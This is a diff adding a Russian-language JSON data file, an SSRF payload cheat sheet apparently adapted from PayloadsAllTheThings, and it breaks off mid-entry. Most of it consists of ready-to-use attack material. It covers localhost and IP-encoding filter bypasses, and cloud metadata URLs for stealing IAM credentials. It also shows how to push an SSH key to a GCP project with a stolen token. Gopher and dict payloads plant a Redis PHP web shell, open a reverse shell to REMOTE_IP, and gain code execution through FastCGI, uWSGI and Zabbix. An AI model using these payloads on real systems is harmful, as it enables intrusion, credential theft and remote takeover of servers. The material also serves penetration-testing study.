@@ -1,0 +1,524 @@
+{
+  "category": "Server Side Request Forgery",
+  "source": "PayloadsAllTheThings/Server Side Request Forgery/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Как работает SSRF (схема)",
+      "language": "image",
+      "tags": ["ssrf", "methodology", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/SSRF_stream.png",
+        "caption": "Атакующий заставляет сервер example.com сделать запрос на google.com. Ответ от целевого сервиса возвращается атакующему через уязвимый сервер. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Что такое SSRF и куда бьём",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "SSRF возникает, когда атакующий заставляет сервер слать HTTP-запросы в непредусмотренное место. Причина — сервер берёт URL/IP от пользователя и не валидирует его.\n\nОсновные направления эксплуатации:\n• Доступ к cloud-метаданным (AWS/GCP/Azure → кража кредов).\n• Чтение локальных файлов на сервере (file://).\n• Сетевая разведка, сканирование портов через SSRF.\n• Отправка пакетов внутренним сервисам (Redis, Memcached, FastCGI…) → нередко RCE на соседней машине."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать SSRF",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Любой параметр, принимающий URL: url=, link=, src=, dest=, redirect=, proxy=, fetch=, image=, callback=.\n• Импорт по URL, превью ссылок, веб-хуки, конвертеры (HTML→PDF, видео→GIF), загрузка аватара по URL.\n• Парсеры XML/SVG, ImageMagick, ffmpeg.\n• Первым делом подставляй http://169.254.169.254/latest/meta-data/ и http://127.0.0.1 — если сервер ходит, эскалируй."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы для SSRF",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "SSRFmap (swisskyrepo) — автоматический фаззер и эксплуатация SSRF.\nGopherus (tarunkant) — генерирует gopher-ссылки для RCE в Redis/Memcached/MySQL/FastCGI/SMTP.\nSee-SURF (In3tinct) — поиск потенциальных SSRF-параметров.\nSSRF-Sheriff (teknogeek) — сервер для детекта SSRF (Go).\nsurf (assetnote) — отбирает живые SSRF-кандидаты.\nipfuscator (dwisiswant0) — быстро генерит альтернативные представления IPv4.\nr3dir (Horlad) — сервис редиректов для обхода SSRF-фильтров, не проверяющих Location."
+    },
+
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Базовые цели — localhost / 127.0.0.1 / 0.0.0.0",
+      "language": "http",
+      "tags": ["bypass", "localhost"],
+      "body": "http://localhost:80\nhttp://localhost:22\nhttps://localhost:443\nhttp://127.0.0.1:80\nhttp://127.0.0.1:22\nhttps://127.0.0.1:443\nhttp://0.0.0.0:80\nhttp://0.0.0.0:22\nhttps://0.0.0.0:443"
+    },
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Обход localhost через IPv6",
+      "language": "http",
+      "tags": ["bypass", "localhost", "ipv6"],
+      "body": "http://[::]:80/\nhttp://[0000::1]:80/\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\nhttp://[::ffff:127.0.0.1]"
+    },
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Обход localhost через домены-редиректы",
+      "language": "table",
+      "tags": ["bypass", "localhost", "dns"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Домен", "Резолвится в"],
+          "rows": [
+            ["localtest.me", "::1"],
+            ["localh.st", "127.0.0.1"],
+            ["spoofed.[BURP_COLLABORATOR]", "127.0.0.1"],
+            ["spoofed.redacted.oastify.com", "127.0.0.1"],
+            ["company.127.0.0.1.nip.io", "127.0.0.1"],
+            ["<anything>.<IP>.nip.io", "<IP> (любой адрес как DNS-имя)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Обход localhost через CIDR 127.0.0.0/8",
+      "language": "http",
+      "tags": ["bypass", "localhost", "cidr"],
+      "body": "http://127.127.127.127\nhttp://127.0.1.3\nhttp://127.0.0.0"
+    },
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Обход через сокращённую запись адреса",
+      "language": "http",
+      "tags": ["bypass", "localhost"],
+      "body": "http://0/\nhttp://127.1\nhttp://127.0.1"
+    },
+    {
+      "subcategory": "Обход фильтров — localhost",
+      "title": "Обход через IPv6-хостнеймы (/etc/hosts)",
+      "language": "http",
+      "tags": ["bypass", "localhost", "ipv6"],
+      "body": "http://ip6-localhost = ::1\nhttp://ip6-loopback = ::1"
+    },
+
+    {
+      "subcategory": "Обход фильтров — кодирование IP",
+      "title": "Кодирование IP — десятичное / восьмеричное / шестнадцатеричное",
+      "language": "table",
+      "tags": ["bypass", "ip-encoding"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Представление", "Пример", "Эквивалент"],
+          "rows": [
+            ["Decimal", "http://2130706433/", "http://127.0.0.1"],
+            ["Decimal", "http://3232235521/", "http://192.168.0.1"],
+            ["Decimal", "http://3232235777/", "http://192.168.1.1"],
+            ["Decimal", "http://2852039166/", "http://169.254.169.254"],
+            ["Octal", "http://0177.0.0.1/", "http://127.0.0.1"],
+            ["Octal (варианты префикса)", "http://o177.0.0.1/ / http://0o177.0.0.1/ / http://q177.0.0.1/", "http://127.0.0.1"],
+            ["Hex", "http://0x7f000001", "http://127.0.0.1"],
+            ["Hex", "http://0xc0a80101", "http://192.168.1.1"],
+            ["Hex", "http://0xa9fea9fe", "http://169.254.169.254"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — кодирование IP",
+      "title": "URL-кодирование пути (single / double)",
+      "language": "http",
+      "tags": ["bypass", "url-encoding"],
+      "body": "http://127.0.0.1/%61dmin\nhttp://127.0.0.1/%2561dmin"
+    },
+    {
+      "subcategory": "Обход фильтров — кодирование IP",
+      "title": "Enclosed alphanumeric / Unicode в хосте",
+      "language": "text",
+      "tags": ["bypass", "unicode"],
+      "body": "Enclosed alphanumeric (заглавные/строчные в кружках) резолвятся как обычные буквы:\nhttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com\n\nUnicode-цифры: в .NET и Python 3 regex по умолчанию поддерживает unicode, и \\d включает не только 0123456789, но и ๐๑๒๓๔๕๖๗๘๙ — можно проскочить мимо blacklist."
+    },
+
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Обход через редирект (307/308 сохраняют метод и тело)",
+      "language": "text",
+      "tags": ["bypass", "redirect", "open-redirect"],
+      "body": "Схема: на whitelist-хосте делаешь страницу, редиректящую на целевой внутренний URL (напр. 192.168.0.1), и натравливаешь SSRF на vulnerable.com/index.php?url=http://redirect-server\nКоды 307 Temporary Redirect и 308 Permanent Redirect сохраняют HTTP-метод и тело запроса после редиректа.\nЧтобы не поднимать свой сервер, используй r3dir (Horlad)."
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Редирект через готовый сервис r3dir",
+      "language": "http",
+      "tags": ["bypass", "redirect"],
+      "body": "https://307.r3dir.me/--to/?url=http://localhost\nhttps://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me"
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "DNS Rebinding (1u.ms)",
+      "language": "bash",
+      "tags": ["bypass", "dns-rebinding"],
+      "body": "# Домен, поочерёдно резолвящийся в 1.2.3.4 и 169.254.169.254\nmake-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\n\n# Проверяем чередование адресов\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 1.2.3.4\n\n$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nName:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms\nAddress: 169.254.169.254"
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Расхождения парсеров URL (Orange Tsai)",
+      "language": "http",
+      "tags": ["bypass", "url-parser"],
+      "body": "http://127.1.1.1:80\\@127.2.2.2:80/\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\nhttp:127.0.0.1/"
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Как разные библиотеки парсят http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
+      "language": "text",
+      "tags": ["bypass", "url-parser"],
+      "body": "Один URL — разные хосты-назначения в зависимости от библиотеки:\n• urllib2 → берёт 1.1.1.1\n• requests и браузеры → редиректят на 2.2.2.2\n• urllib → резолвит 3.3.3.3\n• некоторые парсеры превращают http:127.0.0.1/ в http://127.0.0.1/\nИдея: если фильтр и HTTP-клиент используют разные парсеры, хост, который видит фильтр, и хост, куда реально уходит запрос, различаются."
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Матрица уязвимых парсеров (CR-LF + URL parsing)",
+      "language": "image",
+      "tags": ["bypass", "url-parser", "crlf"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/SSRF_Parser.png",
+        "caption": "Какие библиотеки уязвимы к CR-LF-инъекции (Path/Host/SNI) и к подмене Port/Host/Path при парсинге URL: Python httplib/urllib/urllib2, Ruby Net::HTTP, Java net.URL, Perl LWP, NodeJS http, PHP http_wrapper, Wget. Исследование Orange Tsai."
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Пример вывода парсеров для \\@-пейлоада",
+      "language": "image",
+      "tags": ["bypass", "url-parser"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/server-side-request-forgery/WeakParser.jpg",
+        "caption": "Прогон http://127.1.1.1:80\\@127.2.2.2:80/ через парсеры: Go net/url, Java net.URL, PHP parse_url, Perl URI, Ruby addressable берут host=127.2.2.2, а Python urlparse оставляет весь хвост в host. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Обход PHP filter_var(FILTER_VALIDATE_URL)",
+      "language": "php",
+      "tags": ["bypass", "php", "filter_var"],
+      "body": "<?php\n// В PHP 7.0.25 filter_var с FILTER_VALIDATE_URL пропускает такие URL:\n echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));\n echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));\n?>\n// Валидными считаются:\n// http://test???test.com\n// 0://evil.com:80;http://google.com:80/"
+    },
+    {
+      "subcategory": "Обход фильтров — прочее",
+      "title": "Схема jar:// (полностью слепой)",
+      "language": "http",
+      "tags": ["bypass", "jar", "java", "blind"],
+      "body": "jar:scheme://domain/path!/\njar:http://127.0.0.1!/\njar:https://127.0.0.1!/\njar:ftp://127.0.0.1!/"
+    },
+
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS — эндпоинты метаданных (IMDS)",
+      "language": "http",
+      "tags": ["aws", "metadata", "imds"],
+      "body": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/user-data\n[fd00:ec2::254] — IPv6-эндпоинт"
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS — IAM-кредентиалы роли (IMDSv1)",
+      "language": "http",
+      "tags": ["aws", "metadata", "iam", "credentials"],
+      "body": "http://169.254.169.254/latest/meta-data/iam/security-credentials\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]"
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS — IMDSv2 (нужен токен X-aws-ec2-metadata-token)",
+      "language": "bash",
+      "tags": ["aws", "metadata", "imdsv2"],
+      "body": "export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\""
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS — обход WAF через DNS и редирект",
+      "language": "http",
+      "tags": ["aws", "metadata", "waf-bypass"],
+      "body": "http://instance-data\nhttp://169.254.169.254\nhttp://169.254.169.254.nip.io/\nStatic:http://nicob.net/redir6a\nDynamic:http://nicob.net/redir-http-169.254.169.254:80-"
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS — кодирование 169.254.169.254 для обхода WAF",
+      "language": "table",
+      "tags": ["aws", "ip-encoding", "waf-bypass"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Представление", "Значение"],
+          "rows": [
+            ["Dotted decimal with overflow", "http://425.510.425.510"],
+            ["Dotless decimal", "http://2852039166"],
+            ["Dotless decimal with overflow", "http://7147006462"],
+            ["Dotted hexadecimal", "http://0xA9.0xFE.0xA9.0xFE"],
+            ["Dotless hexadecimal", "http://0xA9FEA9FE"],
+            ["Dotless hexadecimal with overflow", "http://0x41414141A9FEA9FE"],
+            ["Dotted octal", "http://0251.0376.0251.0376"],
+            ["Dotted octal with padding", "http://0251.00376.000251.0000376"],
+            ["Mixed (octal + decimal)", "http://0251.254.169.254"],
+            ["IPv6 Compressed", "http://[::ffff:a9fe:a9fe]"],
+            ["IPv6 Expanded", "http://[0:0:0:0:0:ffff:a9fe:a9fe]"],
+            ["IPv6/IPv4", "http://[0:0:0:0:0:ffff:169.254.169.254]"],
+            ["IPv6", "http://[fd00:ec2::254]"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS ECS — кредентиалы роли по UUID",
+      "language": "bash",
+      "tags": ["aws", "ecs", "credentials"],
+      "body": "# Сначала вытащи UUID из /proc/self/environ (нужен file-read), затем:\ncurl http://169.254.170.2/v2/credentials/<UUID>\n# Получишь IAM-ключи привязанной роли"
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS Elastic Beanstalk — accountId, region, креды",
+      "language": "http",
+      "tags": ["aws", "beanstalk", "credentials"],
+      "body": "http://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role\n# Затем с полученными ключами: aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/"
+    },
+    {
+      "subcategory": "Cloud — AWS",
+      "title": "AWS Lambda — Runtime API",
+      "language": "http",
+      "tags": ["aws", "lambda"],
+      "body": "http://localhost:9001/2018-06-01/runtime/invocation/next\nhttp://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+    },
+
+    {
+      "subcategory": "Cloud — GCP",
+      "title": "Google Cloud — эндпоинты (нужен Metadata-Flavor: Google)",
+      "language": "http",
+      "tags": ["gcp", "metadata"],
+      "body": "http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true"
+    },
+    {
+      "subcategory": "Cloud — GCP",
+      "title": "Google Cloud — Beta-эндпоинт (БЕЗ заголовка)",
+      "language": "http",
+      "tags": ["gcp", "metadata", "bypass"],
+      "body": "http://metadata.google.internal/computeMetadata/v1beta1/\nhttp://metadata.google.internal/computeMetadata/v1beta1/?recursive=true\nhttp://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
+    },
+    {
+      "subcategory": "Cloud — GCP",
+      "title": "Google Cloud — выставить заголовки через gopher",
+      "language": "http",
+      "tags": ["gcp", "gopher", "metadata"],
+      "body": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a"
+    },
+    {
+      "subcategory": "Cloud — GCP",
+      "title": "Google Cloud — добавить SSH-ключ через украденный токен",
+      "language": "bash",
+      "tags": ["gcp", "ssh", "privesc"],
+      "body": "# Проверить scope токена\ncurl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA\n\n# Если есть auth/compute — запушить свой SSH-ключ в метаданные проекта\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" \\\n-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" \\\n-H \"Content-Type: application/json\" \\\n--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'"
+    },
+
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Azure — Instance Metadata Service (нужен Metadata: true)",
+      "language": "http",
+      "tags": ["azure", "metadata"],
+      "body": "http://169.254.169.254/metadata/v1/maintenance\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Digital Ocean — метаданные",
+      "language": "http",
+      "tags": ["digitalocean", "metadata"],
+      "body": "http://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Oracle Cloud — метаданные",
+      "language": "http",
+      "tags": ["oracle", "metadata"],
+      "body": "http://192.0.0.192/latest/\nhttp://192.0.0.192/latest/user-data/\nhttp://192.0.0.192/latest/meta-data/\nhttp://192.0.0.192/latest/attributes/"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Alibaba — метаданные",
+      "language": "http",
+      "tags": ["alibaba", "metadata"],
+      "body": "http://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Hetzner Cloud — метаданные",
+      "language": "http",
+      "tags": ["hetzner", "metadata"],
+      "body": "http://169.254.169.254/hetzner/v1/metadata\nhttp://169.254.169.254/hetzner/v1/metadata/hostname\nhttp://169.254.169.254/hetzner/v1/metadata/instance-id\nhttp://169.254.169.254/hetzner/v1/metadata/public-ipv4\nhttp://169.254.169.254/hetzner/v1/metadata/private-networks\nhttp://169.254.169.254/hetzner/v1/metadata/availability-zone\nhttp://169.254.169.254/hetzner/v1/metadata/region"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "OpenStack / RackSpace / HP Helion / Packet",
+      "language": "http",
+      "tags": ["openstack", "metadata"],
+      "body": "http://169.254.169.254/openstack\nhttp://169.254.169.254/2009-04-04/meta-data/\nhttps://metadata.packet.net/userdata"
+    },
+    {
+      "subcategory": "Cloud — прочие провайдеры",
+      "title": "Kubernetes ETCD / Docker / Rancher",
+      "language": "bash",
+      "tags": ["kubernetes", "docker", "rancher", "metadata"],
+      "body": "# Kubernetes ETCD — API-ключи, внутренние IP/порты\ncurl -L http://127.0.0.1:2379/version\ncurl http://127.0.0.1:2379/v2/keys/?recursive=true\n\n# Docker Engine API\nhttp://127.0.0.1:2375/v1.24/containers/json\ncurl --unix-socket /var/run/docker.sock http://foo/containers/json\ncurl --unix-socket /var/run/docker.sock http://foo/images/json\n\n# Rancher\ncurl http://rancher-metadata/<version>/<path>"
+    },
+
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "file:// — чтение файлов",
+      "language": "http",
+      "tags": ["protocol", "file", "file-read"],
+      "body": "file:///etc/passwd\nfile://\\/\\/etc/passwd"
+    },
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "http:// — фетч и сканирование портов",
+      "language": "http",
+      "tags": ["protocol", "http", "port-scan"],
+      "body": "ssrf.php?url=http://127.0.0.1:22\nssrf.php?url=http://127.0.0.1:80\nssrf.php?url=http://127.0.0.1:443"
+    },
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "dict:// — обращение к словарным/текстовым сервисам",
+      "language": "http",
+      "tags": ["protocol", "dict"],
+      "body": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>\nssrf.php?url=dict://attacker:11111/"
+    },
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "sftp:// / tftp:// / ldap:// / netdoc://",
+      "language": "http",
+      "tags": ["protocol", "sftp", "tftp", "ldap"],
+      "body": "ssrf.php?url=sftp://evil.com:11111/\nssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\nssrf.php?url=ldap://localhost:11211/%0astats%0aquit\nssrf.php?url=netdoc:///etc/passwd"
+    },
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "gopher:// — отправка произвольных TCP-данных",
+      "language": "http",
+      "tags": ["protocol", "gopher"],
+      "body": "gopher://[host]:[port]/[type][selector]\ngopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"
+    },
+    {
+      "subcategory": "Протоколы (URL schemes)",
+      "title": "Подсказка по netdoc://",
+      "language": "text",
+      "tags": ["protocol", "netdoc", "java"],
+      "body": "netdoc:// — обёртка для Java, когда payload спотыкается о символы \\n и \\r. Удобно для чтения файлов, когда file:// режется фильтром или ломается на переносах строк."
+    },
+
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "Redis → веб-шелл через CONFIG SET (raw-команды)",
+      "language": "text",
+      "tags": ["gopher", "redis", "rce", "webshell"],
+      "body": "CONFIG SET dir /var/www/html\nCONFIG SET dbfilename file.php\nSET mykey \"<?php system($_GET[0])?>\"\nSAVE\n\nИдея: меняем dir на webroot, dbfilename на file.php, в ключ кладём PHP-шелл, SAVE сбрасывает дамп на диск → /var/www/html/file.php."
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "Redis → веб-шелл через dict://",
+      "language": "http",
+      "tags": ["gopher", "redis", "dict", "rce"],
+      "body": "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html\ndict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php\ndict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\"\ndict://127.0.0.1:6379/SAVE"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "Redis → PHP reverse shell через gopher://",
+      "language": "http",
+      "tags": ["gopher", "redis", "reverse-shell", "rce"],
+      "body": "gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml\ngopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php\ngopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22\ngopher://127.0.0.1:6379/_save"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "FastCGI → RCE через gopher:// (php-fpm на :9000)",
+      "language": "http",
+      "tags": ["gopher", "fastcgi", "php-fpm", "rce"],
+      "body": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "MySQL → выполнение запроса через gopher:// (Gopherus)",
+      "language": "bash",
+      "tags": ["gopher", "mysql", "gopherus"],
+      "body": "$ python2.7 ./gopherus.py --exploit mysql\nGive MySQL username: root\nGive query to execute: SELECT 123;\n\ngopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "Memcached → RCE через Gopherus",
+      "language": "bash",
+      "tags": ["gopher", "memcached", "gopherus"],
+      "body": "# Memcached по умолчанию на :11211, уязвим на десериализации\npython2.7 ./gopherus.py --exploit pymemcache\npython2.7 ./gopherus.py --exploit rbmemcache\npython2.7 ./gopherus.py --exploit phpmemcache\npython2.7 ./gopherus.py --exploit dmpmemcache"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "SMTP → отправка письма через gopher://",
+      "language": "http",
+      "tags": ["gopher", "smtp"],
+      "body": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "SMTP → генератор gopher-payload (PHP-редирект)",
+      "language": "php",
+      "tags": ["gopher", "smtp", "redirect"],
+      "body": "<?php\n    $commands = array(\n            'HELO victim.com',\n            'MAIL FROM: <admin@victim.com>',\n            'RCPT To: <User@[ATTACKER.DOMAIN.TLD]>',\n            'DATA',\n            'Subject: @hacker!',\n            'Hello Friend',\n            '.'\n    );\n    $payload = implode('%0A', $commands);\n    header('Location: gopher://0:25/_'.$payload);\n?>"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "uWSGI → RCE через gopher:// (UWSGI_FILE)",
+      "language": "http",
+      "tags": ["gopher", "wsgi", "uwsgi", "rce"],
+      "body": "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "uWSGI — разбор пакета UWSGI_FILE",
+      "language": "table",
+      "tags": ["gopher", "wsgi", "uwsgi"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Поле", "Размер", "Значение"],
+          "rows": [
+            ["modifier1", "1 байт", "0 (%00)"],
+            ["datasize", "2 байта", "26 (%1A%00)"],
+            ["modifier2", "1 байт", "0 (%00)"],
+            ["key length", "2 байта", "10 (%0A%00)"],
+            ["key data", "m байт", "UWSGI_FILE"],
+            ["value length", "2 байта", "12 (%0C%00)"],
+            ["value data", "n байт", "/tmp/test.py"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "Zabbix Agent → RCE через gopher:// (EnableRemoteCommands=1)",
+      "language": "http",
+      "tags": ["gopher", "zabbix", "rce"],
+      "body": "gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D"
+    },
+    {
+      "subcategory": "Gopher-смаглинг сервисов",
+      "title": "DNS AXFR → выгрузка субдоменов (генератор gopher)",
+      "language": "python",
+      "tags": ["gopher", "dns", "axfr"],
+      "body": "from urllib.parse import quote\ndomain,tld = \"example.lab\".split('.')\ndns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP\ndns_request += b\"\\x00\\x01\"            # QCOUNT\ndns_request += b\"\\x00\\x00\"            # ANCOUNT\ndns_request += b\"\\x00\\x00\"            # NSCOUNT\ndns_request += b\"\\x00\\x00\"            # ARCOUNT\ndns_request += len(domain).to_bytes() # LEN DOMAIN\ndns_request += domain.encode()        # DOMAIN\ndns_request += len(tld).to_bytes()    # LEN TLD\ndns_request += tld.encode()           # TLD\ndns_request += b\"\\x00\"                # DNAME EOF\ndns_request += b\"\\x00\\xFC\"            # QTYPE AXFR (252)\ndns_request += b\"\\x00\\x01\"            # QCLASS IN (1)\ndns_request = len(dns_request).to_bytes(2, byteorder=\"big\") + dns_request\nprint(f'gopher://127.0.0.1:25/_{quote(dns_request)}')"
+    },
+
+    {
+      "subcategory": "Blind SSRF и эскалация",
